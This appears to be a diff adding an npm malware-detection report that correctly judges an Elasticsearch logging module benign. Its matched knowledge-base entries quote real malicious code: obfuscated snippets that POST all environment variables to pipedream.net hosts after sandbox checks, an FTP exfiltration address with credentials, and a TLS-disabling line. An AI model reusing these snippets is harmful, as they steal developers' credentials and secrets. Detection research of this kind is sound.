@@ -1,0 +1,499 @@
+{
+  "package_name": "frox-winston-elasticsearch",
+  "package_version": "0.15.7",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:27:38.239654",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/bulk_writer.js",
+    "package/transformer.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/frox-winston-elasticsearch/0.15.7/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/frox-winston-elasticsearch/0.15.7/package/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/frox-winston-elasticsearch/0.15.7/package/bulk_writer.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "bulk_writer_slice_1",
+          "code_snippet": "const fs = require('fs');\nconst path = require('path');\nconst Promise = require('promise');\nconst debug = require('debug')('winston:elasticsearch');\nconst retry = require('retry');\n\nconst BulkWriter = function BulkWriter(transport, client, options) {\n  this.transport = transport;\n  this.client = client;\n  this.options = options;\n  this.interval = options.interval || 5000;\n  this.healthCheckTimeout = options.healthCheckTimeout || '30s';\n  this.healthCheckWaitForStatus = options.healthCheckWaitForStatus || 'yellow';\n  this.healthCheckWaitForNodes = options.healthCheckWaitForNodes || '>=1';\n  this.waitForActiveShards = options.waitForActiveShards || '1';\n  this.pipeline = options.pipeline;\n  this.retryLimit = options.retryLimit || 400;\n\n  this.bulk = []; // bulk to be flushed\n  this.running = false;\n  this.timer = false;\n  debug('created', this);\n};\n\nBulkWriter.prototype.start = function start() {\n  this.checkEsConnection(this.retryLimit);\n  debug('started');\n};\n\nBulkWriter.prototype.stop = function stop() {\n  this.running = false;\n  if (!this.timer) {\n    return;\n  }\n  clearTimeout(this.timer);\n  this.timer = null;\n  debug('stopped');\n};\n\nBulkWriter.prototype.schedule = function schedule() {\n  const thiz = this;\n  this.timer = setTimeout(() => {\n    thiz.tick();\n  }, this.interval);\n};\n\nBulkWriter.prototype.tick = function tick() {\n  debug('tick');\n  const thiz = this;\n  if (!this.running) {\n    return;\n  }\n  this.flush()\n    .then(() => {\n      // Emulate finally with last .then()\n    })\n    .then(() => {\n      // finally()\n      thiz.schedule();\n    });\n};\n\nBulkWriter.prototype.flush = function flush() {\n  // write bulk to elasticsearch\n  if (this.bulk.length === 0) {\n    debug('nothing to flush');\n    return new Promise((resolve) => {\n      // pause the buffering process when there's no more bulk to flush\n      // thus allowing the process to be terminated\n      this.running = false;\n      return resolve();\n    });\n  }\n  const bulk = this.bulk.concat();\n  this.bulk = [];\n  const body = [];\n  // eslint-disable-next-line object-curly-newline\n  bulk.forEach(({ index, doc, attempts }) => {\n    body.push({\n      [this.options.dataStream ? 'create' : 'index']: {\n        _index: index,\n        pipeline: this.pipeline\n      },\n      attempts\n    },\n    doc);\n  });\n  debug('bulk writer is going to write', body);\n  return this.write(body);\n};\n\nBulkWriter.prototype.append = function append(index, doc) {\n  if (this.options.buffering === true) {\n    if (\n      typeof this.options.bufferLimit === 'number'\n      && this.bulk.length >= this.options.bufferLimit\n    ) {\n      debug('message discarded because buffer limit exceeded');\n      // @todo: i guess we can use callback to notify caller\n      return;\n    }\n    this.bulk.unshift({\n      index,\n      doc,\n      attempts: 0\n    });\n    // resume the buffering process\n    if (!this.running) {\n      this.running = true;\n      this.tick();\n    }\n  } else {\n    this.write([\n      { [this.options.dataStream ? 'create' : 'index']: { _index: index, pipeline: this.pipeline } },\n      doc\n    ]);\n  }\n};\n\nBulkWriter.prototype.write = function write(body) {\n  const thiz = this;\n  const operation = [thiz.options.dataStream ? 'create' : 'index'];\n  debug('writing to ES');\n  return this.client\n    .bulk({\n      body,\n      waitForActiveShards: this.waitForActiveShards,\n      timeout: this.interval + 'ms',\n    })\n    .then((response) => {\n      const res = response.body;\n      if (res && res.errors && res.items) {\n        const err = new Error('ElasticSearch index error');\n        res.items.forEach((item, itemIndex) => {\n          const bodyOp = body[itemIndex * 2];\n          const bodyData = body[itemIndex * 2 + 1];\n          if (item.index) {\n            if (item.index.error) {\n              debug('elasticsearch index error', item.index);\n              console.error('elasticsearch index error', item.index);\n              err.indexError = item.index.error;\n              err.causedBy = bodyData;\n            } else if (item.index.result === 'created') {\n              bodyOp.created = true;\n            }\n          }\n        });\n        throw err;\n      }\n    })\n    .catch((e) => {\n      // rollback this.bulk array\n      const newBody = [];\n      body.forEach((chunk, index, chunks) => {\n        const { attempts, created } = chunk;\n        if (!created && attempts < thiz.retryLimit) {\n          newBody.push({\n            index: chunk[operation]._index,\n            doc: chunks[index + 1],\n            attempts: attempts + 1,\n          });\n        } else {\n          debug('retry attempts exceeded');\n        }\n      });\n\n      const lenSum = thiz.bulk.length + newBody.length;\n      if (thiz.options.bufferLimit && lenSum >= thiz.options.bufferLimit) {\n        thiz.bulk = newBody.concat(\n          thiz.bulk.slice(0, thiz.options.bufferLimit - newBody.length)\n        );\n      } else {\n        thiz.bulk = newBody.concat(thiz.bulk);\n      }\n      debug('error occurred during writing', e);\n      this.stop();\n      this.checkEsConnection(thiz.retryLimit)\n        .catch((err) => thiz.transport.emit('error', err));\n      thiz.transport.emit('warning', e);\n\n      thiz.bulk.forEach((bulk) => {\n        if (bulk.attempts === thiz.retryLimit) {\n          this.transport.emit('error', e);\n        }\n      });\n    });\n};\n\nBulkWriter.prototype.checkEsConnection = function checkEsConnection(retryLimit) {\n  const thiz = this;\n  thiz.esConnection = false;\n\n  const operation = retry.operation({\n    forever: false,\n    retries: retryLimit,\n    factor: 1,\n    minTimeout: 1000,\n    maxTimeout: 10 * 1000,\n    randomize: false\n  });\n  return new Promise((fulfill, reject) => {\n    operation.attempt((currentAttempt) => {\n      debug('checking for ES connection');\n      thiz.client.cluster.health({\n        timeout: thiz.healthCheckTimeout,\n        wait_for_nodes: thiz.healthCheckWaitForNodes,\n        wait_for_status: thiz.healthCheckWaitForStatus\n      })\n        .then(\n          (res) => {\n            thiz.esConnection = true;\n            const start = () => {\n              if (thiz.options.buffering === true) {\n                debug('starting bulk writer');\n                thiz.running = true;\n                thiz.tick();\n              }\n            };\n            // Ensure mapping template is existing if desired\n            if (thiz.options.ensureIndexTemplate) {\n              thiz.ensureIndexTemplate((res1) => {\n                fulfill(res1);\n                start();\n              }, reject);\n            } else {\n              fulfill(true);\n              start();\n            }\n          },\n          (err) => {\n            debug('re-checking for connection to ES');\n            if (operation.retry(err)) {\n              return;\n            }\n            thiz.esConnection = false;\n            debug('cannot connect to ES');\n            reject(new Error('Cannot connect to ES'));\n          }\n        );\n    });\n  });\n};\n\nBulkWriter.prototype.ensureIndexTemplate = function ensureIndexTemplate(\n  fulfill,\n  reject\n) {\n  const thiz = this;\n\n  const indexPrefix = typeof thiz.options.indexPrefix === 'function'\n    ? thiz.options.indexPrefix()\n    : thiz.options.indexPrefix;\n  // eslint-disable-next-line prefer-destructuring\n  let indexTemplate = thiz.options.indexTemplate;\n  if (indexTemplate === null || typeof indexTemplate === 'undefined') {\n    const rawdata = fs.readFileSync(\n      path.join(__dirname, 'index-template-mapping.json')\n    );\n    indexTemplate = JSON.parse(rawdata);\n  }\n\n  let templateName = indexPrefix;\n  if (thiz.options.dataStream) {\n    if (!thiz.options.index) {\n      // hm, has this to be a console error or better a throw? is it needed at all?\n      console.error('Error while deriving templateName with options', thiz.options);\n    } else {\n      templateName = thiz.options.index;\n    }\n  }\n\n  const tmplCheckMessage = {\n    name: 'template_' + templateName\n  };\n  thiz.client.indices.existsIndexTemplate(tmplCheckMessage).then(\n    (res) => {\n      if (res.statusCode && res.statusCode === 404) {\n        const tmplMessage = {\n          name: 'template_' + templateName,\n          create: true,\n          body: indexTemplate\n        };\n        thiz.client.indices.putIndexTemplate(tmplMessage).then(\n          (res1) => {\n            fulfill(res1.body);\n          },\n          (err1) => {\n            thiz.transport.emit('warning', err1);\n            reject(err1);\n          }\n        );\n      } else {\n        fulfill(res.body);\n      }\n    },\n    (res) => {\n      thiz.transport.emit('warning', res);\n      reject(res);\n    }\n  );\n};\n\nmodule.exports = BulkWriter;\n",
+          "is_malicious": false,
+          "malice_score": 0.4269936184088389,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code performs network operations using the Elasticsearch client to bulk index or create documents, manages retries on failures, and checks Elasticsearch cluster health using the client's cluster.health API. It reads a local file 'index-template-mapping.json' to ensure index templates exist, performing file read operations via fs.readFileSync and JSON parsing. The code manages buffering of bulk data in memory and schedules periodic flushes to Elasticsearch over the network, enabling data exfiltration or logging to an external Elasticsearch cluster. No hardcoded IPs or URLs are present; network endpoints depend on the provided client configuration.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a BulkWriter utility designed to interact with an Elasticsearch cluster for bulk indexing or creating documents. It performs legitimate operations such as buffering data, retrying failed writes, checking cluster health, and ensuring index templates exist. While it does perform network operations and reads a local JSON file, these are standard behaviors for Elasticsearch clients and do not indicate malicious intent. There is no evidence of data exfiltration to unauthorized endpoints, no hardcoded IPs or credentials, no obfuscation, no system manipulation, and no harvesting of sensitive user data. The known malicious patterns involve clear data exfiltration (e.g., FTP uploads with hardcoded credentials, stealing browser data, disabling TLS verification), none of which are present here. The similarity scores to known malware are low (around 0.43) and relate mostly to superficial use of fs or network calls, which are common in many legitimate applications.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42927929759025574,
+              "code_similarity": 0.3442620635032654,
+              "behavior_similarity": 0.5142965316772461,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133830_348434_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants) (NSIS installer (Electron app bundle))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133830_348434/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42839616537094116,
+              "code_similarity": 0.3674013912677765,
+              "behavior_similarity": 0.4893909692764282,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst fs = require('fs');\nconst os = require('os');\nconst browserData = getBrowserData();\nconst credentials = getCredentials();\nconst systemInfo = getSystemInfo();\nconst payload = { browserData, credentials, systemInfo };\n\nuploadToGofile(payload);",
+                "code_behavior": "At runtime, after installation and on app launch, the code uses Node.js APIs to collect system information, browser histories, and credentials from the victim's machine, packages this data, and sends it via network requests to the gofile file-sharing service, resulting in exfiltration of sensitive user data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code systematically harvests sensitive user data (system info, browser histories, credentials) and exfiltrates it to an external file-sharing service (gofile.io), which is a hallmark of infostealer malware.",
+                  "violated_expectations": "A legitimate Electron application should not access or transmit browser histories, credentials, or system information without explicit user consent, nor should it upload such data to anonymous third-party file-sharing services.",
+                  "similar_legitimate_use": "Some legitimate diagnostic or support tools may collect system information for troubleshooting, but they do not access browser credentials or upload sensitive data to anonymous file-sharing services.",
+                  "key_indicators": [
+                    "Access to browser data and credential stores via Node.js APIs",
+                    "Collection of system information using Node.js modules (e.g., os, fs)",
+                    "Network exfiltration to gofile.io or similar file-sharing domains",
+                    "Malicious logic embedded in Electron app's asar archive (e.g., a.js)",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, after installation and on app launch",
+                  "file_location": "app\\resources\\app.asar > a.js (Node.js script inside Electron app bundle)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants)",
+                  "package_manager": "NSIS installer (Electron app bundle)",
+                  "package_versions": "Unknown (malicious samples: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "The entire package is malicious because it masquerades as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe), but actually installs and executes an Electron-based infostealer. The malware leverages Node.js capabilities within the Electron framework to harvest sensitive data such as system information, browser histories, and credentials, and exfiltrates this data to external file-sharing services like gofile.io. The use of NSIS installers and Electron's asar archive structure is intended to evade detection and facilitate stealthy data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and runs the NSIS installer masquerading as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Installation and execution of the bundled Electron app."
+                  },
+                  {
+                    "step": 2,
+                    "action": "NSIS installer executes the Electron app, which loads the malicious Node.js code from the asar archive.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution within the Electron app context."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects sensitive data (system information, browser histories, credentials) from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of harvested data for exfiltration."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to the gofile file-sharing service via network requests.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data, achieving the final objective of data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser data and credentials via Node.js APIs shortly after installation or first run",
+                    "Network connections to file-sharing services (e.g., gofile.io) initiated by Electron-based applications",
+                    "Electron apps bundled in NSIS installers that immediately execute the main app post-installation",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.asar archive containing suspicious Node.js scripts (e.g., a.js) within Electron app resources",
+                    "NSIS installer files with names mimicking popular software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe)",
+                    "Electron app bundles with embedded scripts referencing credential or browser data APIs"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to gofile.io or similar file-sharing domains from Electron app processes",
+                    "Unusual POST requests containing system, browser, or credential data to external file-sharing services",
+                    "Network activity from newly installed Electron apps to non-standard domains immediately after installation"
+                  ],
+                  "how_to_detect": "Monitor for Electron-based applications that, upon installation or first run, access browser credential stores, system information, or user data, and then initiate outbound connections to file-sharing or data exfiltration services such as gofile.io. Inspect Electron app asar archives for Node.js scripts that reference credential or browser data APIs. Flag NSIS installers that immediately execute bundled Electron apps, especially if the app is not from a verified publisher or is distributed outside official channels. Correlate file, process, and network activity to identify infostealer behavior patterns."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104221_852989_snippet_2",
+              "source_package": "btc-api-node (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104221_852989/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.426641047000885,
+              "code_similarity": 0.3749240040779114,
+              "behavior_similarity": 0.47835808992385864,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// B64 encoded values in index.js\nconst env = process.env;\nenv['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';",
+                "code_behavior": "At runtime, index.js sets the NODE_TLS_REJECT_UNAUTHORIZED environment variable to '0', globally disabling SSL/TLS certificate verification for all outgoing network requests, allowing untrusted connections.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling SSL/TLS verification exposes all network traffic to interception and man-in-the-middle attacks, and is a known tactic to bypass security controls and facilitate malicious communications.",
+                  "violated_expectations": "Legitimate packages should never globally disable SSL/TLS verification, as this undermines the security of all network communications.",
+                  "similar_legitimate_use": "In rare cases, developers may disable verification for local debugging, but this should never occur in production or in published packages.",
+                  "key_indicators": [
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in process.env",
+                    "Obfuscated (base64-encoded) values in index.js",
+                    "Global impact on all subsequent network requests"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall/runtime",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "btc-api-node",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (removed quickly after upload)",
+                  "why_malicious": "The package impersonates a legitimate cryptocurrency API library but contains a postinstall script that executes a malicious index.js file. This file disables SSL/TLS verification globally, downloads a payload from an attacker-controlled domain, creates hidden directories, and writes compromise markers, enabling further compromise and persistence on the system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js and environment manipulation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js disables SSL/TLS verification for all outgoing network requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Allows unverified and potentially malicious network communication"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js creates a hidden directory and downloads a token file from attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is marked as compromised and ready for stage 2 payloads"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch index.js or similar files during npm package installation",
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in environment variables within package scripts",
+                    "Creation of hidden directories (e.g., .electron) during install process",
+                    "Download of files from non-standard or suspicious domains (e.g., npmaudit.com) during installation"
+                  ],
+                  "file_indicators": [
+                    ".electron/token",
+                    "Presence of index.js with base64-encoded values",
+                    "package.json with postinstall script referencing index.js"
+                  ],
+                  "network_indicators": [
+                    "npmaudit.com (attacker-controlled C2 domain)",
+                    "HTTP(S) requests to https://npmaudit.com/api/v4/init endpoint"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute JavaScript files, especially those that set NODE_TLS_REJECT_UNAUTHORIZED=0 or download files from non-standard domains. Flag packages that create hidden directories or write token files (e.g., .electron/token) during installation. Network monitoring should alert on connections to npmaudit.com or similar suspicious domains and requests to /api/v4/init. YARA rules can be used to detect the base64-encoded string 'Tk9ERV9UTFNfUkVKRUNUX1VOQVVUSE9SSVpFRA==' in process environments or index.js files."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202037_549619_snippet_2",
+              "source_package": "n-t-internationalization (and 147+ others, see dc file) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202037_549619/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4220982789993286,
+              "code_similarity": 0.359812468290329,
+              "behavior_similarity": 0.48438411951065063,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "//hackerone.com/homosec\n//Bug Bounty Security Reasearch White Hat\n//homosec@wearehackerone.com\nif (Object.keys(process.env).length > 15 &&\n    !(process.env.COLOR == '0' && process.env.EDITOR == 'vi' && process.env.LOGNAME && process.env.OLDPWD) &&\n!(process.env.APPDATA === '/analysis/bait')&&\n!(process.env._ === '/usr/bin/timelimit')&&\n!(process.env.npm_config_registry === 'https://mirrors.tencent.com/npm/')) {\nvar _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\x36\\x35\\x39\\x64\\x63\\x61\\x38\\x32\\x30\\x61\\x33\\x37\\x65\\x36\\x66\\x35\\x64\\x33','\\x6D','','\\x70\\x69\\x70\\x65','\\x64\\x72\\x65\\x61\\x6D','\\x6E\\x65\\x74','\\x2Fn-t-internationalization','\\x50\\x4F\\x53\\x54','\\x72\\x65\\x71\\x75\\x65\\x73\\x74','\\x62\\x61\\x73\\x65\\x36\\x34','\\x65\\x6E\\x76','\\x73\\x74\\x72\\x69\\x6E\\x67\\x69\\x66\\x79','\\x66\\x72\\x6F\\x6D','\\x77\\x72\\x69\\x74\\x65','\\x65\\x6E\\x64'];const http=require(_0xee82[0]);req= http[_0xee82[11]]({host:[_0xee82[3],_0xee82[4],[_0xee82[6],_0xee82[7]][_0xee82[2]](_0xee82[5]),_0xee82[8]][_0xee82[2]](_0xee82[1]),path:_0xee82[9],method:_0xee82[10]});req[_0xee82[16]](Buffer[_0xee82[15]](JSON[_0xee82[14]](process[_0xee82[13]]).toString(_0xee82[12])));req[_0xee82[17]]()\n}",
+                "code_behavior": "At preinstall time, index.js checks for sandbox or analysis environments, then serializes and exfiltrates all environment variables via HTTPS POST to an attacker-controlled pipedream.net domain, resulting in theft of credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code exfiltrates all environment variables, which often contain sensitive information such as credentials, API keys, and tokens. The use of obfuscation and anti-analysis checks further indicates deliberate evasion and malicious intent.",
+                  "violated_expectations": "Legitimate packages do not exfiltrate environment variables or use obfuscation to hide their behavior, especially not during installation.",
+                  "similar_legitimate_use": "Bug bounty proof-of-concept code may exfiltrate a single variable to demonstrate code execution, but never the entire environment or with obfuscation and anti-analysis logic.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript code in index.js",
+                    "Bulk access to process.env",
+                    "Network exfiltration via HTTPS POST to external domain (*.pipedream.net)",
+                    "Anti-analysis and sandbox environment checks"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via node index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "n-t-internationalization (and 147+ others, see dc file)",
+                  "package_manager": "npm",
+                  "package_versions": "141.0.0 (and possibly others)",
+                  "why_malicious": "The packages are mass-generated and published with a preinstall hook that executes obfuscated JavaScript to exfiltrate all environment variables to an attacker-controlled domain. The use of automation, obfuscation, anti-analysis checks, and exfiltration of sensitive data such as credentials and tokens are clear indicators of a coordinated supply chain attack."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker runs dc.sh to mass-generate and publish malicious packages to npm.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious packages are available for installation by unsuspecting users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "User installs one of the malicious packages, triggering the preinstall hook.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "index.js is executed on the user's machine during installation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js checks for analysis or sandbox environments and, if not detected, exfiltrates all environment variables to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data, potentially including credentials and secrets."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package with preinstall hook executing node index.js",
+                    "index.js accessing process.env and sending serialized data over HTTPS",
+                    "Obfuscated JavaScript code present in install scripts",
+                    "Anti-analysis or sandbox environment checks before payload execution"
+                  ],
+                  "file_indicators": [
+                    "Presence of dc.sh and dc file used for mass package generation",
+                    "package.json with preinstall: node index.js script",
+                    "index.js containing obfuscated or encoded strings for network exfiltration"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to *.pipedream.net during npm install",
+                    "Unexpected network activity from npm install processes"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall hooks that execute JavaScript files. Flag packages where index.js accesses process.env and initiates network requests, especially if the code is obfuscated or contains anti-analysis logic. Alert on outbound HTTPS POST requests to known exfiltration domains such as pipedream.net during package installation. Use static analysis to detect mass-published packages with identical or near-identical install scripts and the presence of automation scripts like dc.sh."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102818_710202_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_710202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.420803427696228,
+              "code_similarity": 0.38898396492004395,
+              "behavior_similarity": 0.4526228904724121,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables from process.env, checks for sandbox indicators using a filter, and if not detected, exfiltrates the environment data via a POST request to a dynamically constructed, attacker-controlled domain, resulting in credential and secret theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, obfuscated domain without user consent. The use of dynamic hostname construction and base64 encoding, combined with conditional logic to avoid sandboxes, is characteristic of data theft malware.",
+                  "violated_expectations": "Legitimate packages do not exfiltrate environment variables or send sensitive data to external webhooks, especially not at import-time or without explicit user consent. Telemetry or error reporting would be opt-in, clearly documented, and not obfuscated.",
